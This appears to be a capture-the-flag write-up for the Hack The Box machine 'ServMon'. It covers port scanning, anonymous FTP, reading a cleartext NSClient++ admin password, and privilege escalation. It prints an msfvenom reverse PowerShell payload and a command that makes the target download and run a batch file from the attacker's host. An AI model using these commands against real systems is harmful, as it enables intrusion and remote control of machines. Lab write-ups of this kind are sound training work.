This machine has an IP address 10.10.10.184, which I add to / etc / hosts. 



10.10.10.184    servmon.htb


First, we scan open ports. Since it takes a long time to scan all the ports with nmap, I will first do this with masscan. We scan all TCP and UDP ports from the tun0 interface at a speed of 500 packets per second. 



masscan -e tun0 -p1-65535,U:1-65535 10.10.10.184    --rate=500






The host has many ports open. Now scan them with nmap to filter and select the ones you need. 



nmap servmon.htb -p21,80,49667,49669,22,139,49668,8443,49670,6699,6063,49666,5666,5040,7680,49664,49665,445,135






Now, to get more detailed information about the services that work on ports, run a scan with the -A option. 



nmap -A servmon.htb -p21,80,22,139,8443,6699,6063,5666,5040,7680,445,135






As can be seen from the nmap scan, it is possible to work with an FTP server on behalf of anonymous. We go in and look around.

Inspecting the services provided by nmap, NSClient runs on port 8443.







And for him, too, we find an exploit.







Thus, local users with low privileges can read the web administrator password in clear text from the configuration file.

Because the NSClient ++ service runs as a system, a user with a low privilege level can receive privilege escalation.

The first step is to get the password of the web administrator.

type "c:\program files\nsclient++\nsclient.ini"











We see the allowed host - localhost. Let's get the SHH port.

For this vulnerability, in order not to complete all the actions manually, I used an automated RCE exploit .



First, we generate the load that we will perform for the reverse connection and run the listener. 



msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.60 lport=4321 > ./1.bat






Now on the remote host, download the given bat file from the local machine. 



powershell -c "wget http://10.10.15.60:88/1.bat -O C:\Temp\a.bat"


When everything is ready, we launch the exploit (either the exploit is unstable, or the machine, but successfully completed only the third time).
